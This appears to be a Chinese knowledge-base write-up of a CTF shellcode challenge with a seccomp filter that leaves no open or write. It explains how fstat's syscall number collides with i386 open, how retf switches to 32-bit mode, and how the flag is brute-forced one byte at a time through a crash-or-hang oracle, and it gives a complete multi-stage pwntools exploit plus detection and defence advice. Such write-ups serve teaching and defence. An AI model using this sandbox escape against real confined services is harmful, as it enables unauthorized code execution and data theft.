---
id: binary-pwn-sandbox-escape-read-mmap-fstat-retf-i386-open-bruteforce
title: seccomp 白名单只剩 read/mmap/fstat 的“无 open 无 write”题：fstat(5) 即 i386 open(5)，retf 打包 CS 切 32 位开文件 + cmp 自环爆破 flag
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: read-mmap-fstat-retf-i386-open-bruteforce
aliases:
- 2021 强网杯初赛 shellcode
- 只有 read 和 mmap
- fstat 号碰撞 32 位 open
- retf 打包 CS 0x23
- add rsi 0x2300000000
- 无 O 无 W 的 ORW
- alpha3 首段
- 多阶段 shellcode staging
tags:
- binary
- pwn
- ctf
- shellcode
- seccomp
- orw
- retf
- i386
- fstat
- bruteforce
- alpha3
- staging
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V690
  verified_at: '2026-11-13T16:27:56+08:00'
  notes: 已对照原文与截图核对；强网杯 seccomp dump(图12：fstat/alarm/read/mmap/exit_group，stat KILL)与 fstat(5)=i386 open(5) 号碰撞、retf 单槽打包 CS=0x23、add rsi 0x13+0x2300000000、32位 open 后 push 0x33;push 0x40000037;retf、cmp/jz 自环均与 exp 一致。修正 oracle 描述：未命中是 push 0;ret 跳 0 崩溃，并非 exit_group 正常退出。未复跑PoC
---

## 一句话结论

当 seccomp 默认 KILL、白名单只剩 `fstat`(5)、`alarm`(37)、`read`(0)、`mmap`(9)、`exit_group`(231)，既没有 `open` 也没有 `write` 时，可以打一套组合拳：利用 `fstat` 的 64 位编号 5 恰好等于 i386 `open` 的编号，用 64 位 `mmap` 在低地址建 RWX 页、把 32 位阶段读进去，再用 `add rsi, 0x2300000000; push rsi; retf` 把目标地址与 CS=0x23 打包进同一个 8 字节栈槽切到 32 位，`eax=5; int 0x80` 打开 `flag`；随后 `push 0x33; push addr; retf` 切回 64 位 `read` 到固定缓冲区，最后逐字节 `cmp` 猜测值 + `jz` 自环，命中挂起、未命中 `ret` 弹出预置的 0 地址崩溃（SIGSEGV，并非调用 exit_group），攻击端用 EOF/超时差异爆破出 flag。首段若受可打印字符限制，用 ALPHA3（以 rbx 为基址）编码。

## 原理

- **白名单的真实内容**：`seccomp-tools dump` 显示 `A = sys_number` 后只放行 `fstat`(5)、`alarm`(0x25=37)、`read`(0)、`mmap`(9)、`exit_group`(0xe7=231)；`stat`(4) 显式 KILL，其余默认 KILL。注意没有 `open`、没有 `write`；`exit`(60) 不在白名单、`exit_group`(231) 放行——但本例未命中路径是 `push 0; ret` 跳到 0 地址崩溃，并不依赖 `exit_group`。
- **fstat 号碰撞出 i386 open**：x86-64 的 `fstat` 是 5；i386 兼容模式的 `open` 也是 5。过滤器只比较调用号、不比较 `arch`，所以 32 位 `int 0x80` 的 open 正好落在 `fstat` 这条 ALLOW 规则上。这是“白名单里保留了一个看似无害的调用，却与另一 ABI 的危险调用同号”的典型碰撞。
- **retf 打包 CS 的单槽切换**：64 位模式下不带 REX.W 的 `retf`（`cb`）按 32 位操作数做远返回：从栈顶 8 字节弹出 32 位 EIP 和 32 位 CS。把 32 位阶段地址 `addr` 先加 `0x2300000000`（高 32 位变成 0x23），`push rsi` 后栈顶就是 `0x00000023_XXXXXXXX`：retf 弹出 EIP=XXXXXXXX、CS=0x23，进入 i386 兼容模式并跳到 `addr`。另一种写法是 REX.W 的 `retfq`（`48 cb`）先 `push 0x23` 再 `push addr`。
- **切回 64 位**：在 32 位阶段执行 `push 0x33; push <64 位回程地址>; retf`，CS=0x33 回到 64 位；回程地址按 32 位阶段的字节长度精确计算（本组合中为 mmap 基址 + 0x37）。
- **低地址 RWX 页**：`mmap(0x40000000, 0x1000, 7, 0x22, -1, 0)`（mmap 在白名单里）提供 4GB 以下的可写可执行页，32 位阶段（地址按 32 位解析）和 64 位回程都放在这里；`read` 再读入第二阶段 0x1000 字节。
- **多阶段 staging**：首段只做“以 rbx 为基址算地址 → read 0x1040 字节 → jmp”；第二段做 `mmap 0x40000000 + read 0x1000 + jmp rsi`；第三段才包含 retf 32 位 open、retf 回 64 位 read、cmp 爆破。这样每段都很短，便于通过首段的输入长度/字符集限制。
- **缺 write 的 oracle**：cmp 命中时 `jz` 跳回 cmp 自身形成紧循环，进程一直活着；未命中时 `ret` 弹出 `push 0` 预置的 0 地址，进程 SIGSEGV 崩溃、连接 EOF。攻击端每次新起进程发送“只差猜测立即数”的第三段，用 `recv(timeout)` 是否抛 EOF 区分命中（命中则超时无 EOF）。
- **首段可打印编码**：若程序对首段做可见字符过滤，用 ALPHA3（`x64 ascii mixedcase rbx`）把首段编码成字母数字串；解码器以 rbx 为基址定位编码数据，运行时还原出 `read`/`jmp` 指令。后续两段直接以原始字节发送。
- **边界**：需要 IA32 兼容模式与低于 4GB 的 mmap；若过滤器比较 arch 或把 i386 open=5 也 KILL，整个链失效；本 PoC 的 ret 崩溃 oracle 不依赖 `exit_group`，若改用它退出则未放行时会变成 SIGSYS，仍可用 EOF 区分但语义不同；首段若不受字符限制可省略 ALPHA3。

## 触发条件

- 可执行用户 shellcode（多轮 read+跳转），seccomp 白名单只含 read/mmap 类调用 + 一个编号为 5 的放行项（fstat），无 open、无 write。
- `mmap` 可用并能申请低于 4GB 的 RWX 页；`read` 可多次调用以加载多阶段。
- 存在可观测的命中/未命中差异（本例：命中 `jz` 自环挂起，未命中 `ret` 到 0 崩溃）；`exit_group` 是否放行只影响能否用更干净的退出方式构造 oracle。
- 首段若限制可见字符，需要 ALPHA3 以某个入口寄存器为基址编码；flag 路径已知（如 `/flag`）。

## 利用步骤

1. `seccomp-tools dump` 记录白名单：确认 fstat(5) 放行、stat(4) KILL、无 open/write、exit_group 放行；确认没有 arch 比较。
2. 构造首段：用入口寄存器 rbx 计算 `rbx+0x140` 为读入地址，`read(0, 该地址, 0x1040)`，然后 `jmp`；若需要，用 ALPHA3 编码为可见字符。
3. 第二段：`mmap(0x40000000, 0x1000, 7, 0x22, -1, 0)` 建 RWX 页，`read(0, 0x40000000, 0x1000)` 读入第三段，`jmp rsi`。
4. 第三段开头：`add rsi, 0x13; add rsi, 0x2300000000; push rsi; retf` 切 32 位（0x13 是第三段中 32 位阶段的偏移）。
5. 32 位阶段：`mov esp, 0x40000400`；栈上构造 `/flag`；`mov eax,5; int 0x80`；随后 `push 0x33; push 0x40000037; retf` 回 64 位。
6. 64 位回程：`mov rdi, rax; read(fd, 0x40000500, 0x80)`，然后 `cmp byte ptr [rsi+i], guess; jz $-3/-4; ret`。
7. 对每个位置、每个候选字符新起进程发送三段数据，用是否 EOF 判断命中，逐字节拼出 flag。
8. 远程抖动大时对命中字符复测；注意第三段中 cmp 的编码长度（偏移 0 时 3 字节、非 0 时 4 字节）决定 `jz` 回跳的偏移。

## PoC

```python
from pwn import *
context(arch='amd64', os='linux')

def probe(pos, guess):
    p = process('./shellcode')            # 远程换 remote(HOST, PORT)
    # stage1：rbx+0x140 处读入 stage2；如受限可用 ALPHA3 编码
    stage1 = asm('''
        mov r10, rbx
        add r10w, 0x0140
        xor rdi, rdi
        mov rsi, r10
        xor rdx, rdx
        add dx, 0x1040
        xor rax, rax
        syscall
        jmp r10
    ''')
    # stage2：mmap 0x40000000 RWX + read stage3 + jmp
    stage2 = asm('''
        mov rdi, 0x40000000
        mov rsi, 0x1000
        mov rdx, 7
        mov r10, 0x22
        mov r8, 0xFFFFFFFF
        xor r9, r9
        mov rax, 9
        syscall
        mov rsi, rdi
        xor rdi, rdi
        mov rdx, 0x1000
        xor rax, rax
        syscall
        jmp rsi
    ''')
    # stage3：retf 打包 CS 切 32 位 open -> retf 回 64 位 read -> cmp 自环
    jz_off = -3 if pos == 0 else -4
    stage3 = asm(f'''
        mov r10, 0x2300000000
        add rsi, 0x13
        add rsi, r10
        push rsi
        retf
        /* 32-bit stage starts at +0x13 */
        mov esp, 0x40000400
        push 0x0067
        push 0x616c662f
        mov ebx, esp
        xor ecx, ecx
        mov edx, 0x7
        mov eax, 0x5
        int 0x80
        push 0x33
        push 0x40000037
        retf
        /* 64-bit stage at 0x40000037 */
        mov rdi, rax
        mov rsi, 0x40000500
        mov rdx, 0x80
        xor rax, rax
        syscall
        push 0
        cmp byte ptr [rsi+{pos}], {guess}
        jz {jz_off}
        ret
    ''')
    p.sendline(stage1)
    p.sendline(stage2)
    p.sendline(stage3)
    try:
        p.recv(timeout=2)      # 未命中：ret 到 0 崩溃 -> EOF 异常
    except EOFError:
        p.close()
        return False
    p.close()
    return True                # 命中：jz 自环挂起，超时无 EOF
```

说明：`add rsi, 0x13` 中的 0x13 是第三段内 32 位阶段的起始偏移，`push 0x40000037` 是 64 位回程地址；两者必须与实际汇编字节长度一致。首段在存在可见字符限制时先经 ALPHA3 编码再发送。

## 变体与关联

- **只缺 open**：若另有 read/write，用 openat 或 retfq 切 i386 open 即可，无需爆破，见 [[binary-pwn-sandbox-escape-orw-missing-open-openat-retfq-i386-open]]。
- **只缺 write**：用 writev 等替代输出，或像本例一样逐字节比较挂起，见 [[binary-pwn-sandbox-escape-orw-missing-write-writev-pwritev]]、[[binary-pwn-sandbox-escape-shellcode-cmp-timeout-oracle]]、[[binary-pwn-sandbox-escape-orw-flag-byte-bruteforce-time-clean-oracle]]。
- **retf 与 retfq 两种切换写法**：`retf`（无 REX.W，单槽打包 EIP+CS）适合空间紧张；`retfq`（`48 cb`，两槽 push 0x23 + addr）更常见。
- **首段编码**：ALPHA3 见 [[binary-pwn-sandbox-escape-alpha3-visible-shellcode-seccomp-orw]]，手工异或/可见字符构造见 [[binary-pwn-sandbox-escape-visible-shellcode-manual-construction-tricks]]。
- **多阶段 staging**：入口寄存器复用与 reread 见 [[binary-pwn-sandbox-escape-register-reuse-reread-staging]]、[[binary-pwn-sandbox-escape-short-shellcode-self-overwrite-nop-sled-orw]]。

## 检测与防御

- 检测：seccomp 策略静态审计——白名单中任何编号为 5、4、3、11 等“与 i386 关键调用同号”的项都要警惕；运行时监控 64 位进程的 `int 0x80`、`retf` 远返回、低 4GB 的 RWX mmap，以及大量只差一个立即数的短连接。
- 防御：过滤器比较 `arch`（`AUDIT_ARCH_X86_64`）并把 i386 系统调用号一并纳入策略；去掉 fstat 等非必要放行项；不需要兼容模式时禁用 IA32 模拟；对 shellcode 输入做长度与字符白名单只是弱约束，不能替代 seccomp 的能力级封堵。
- 根因：白名单按调用号而非能力设计；缺 write 时把比较结果映射成挂起/退出差异，是任何“可执行用户代码 + 不可输出”场景的通用旁路。
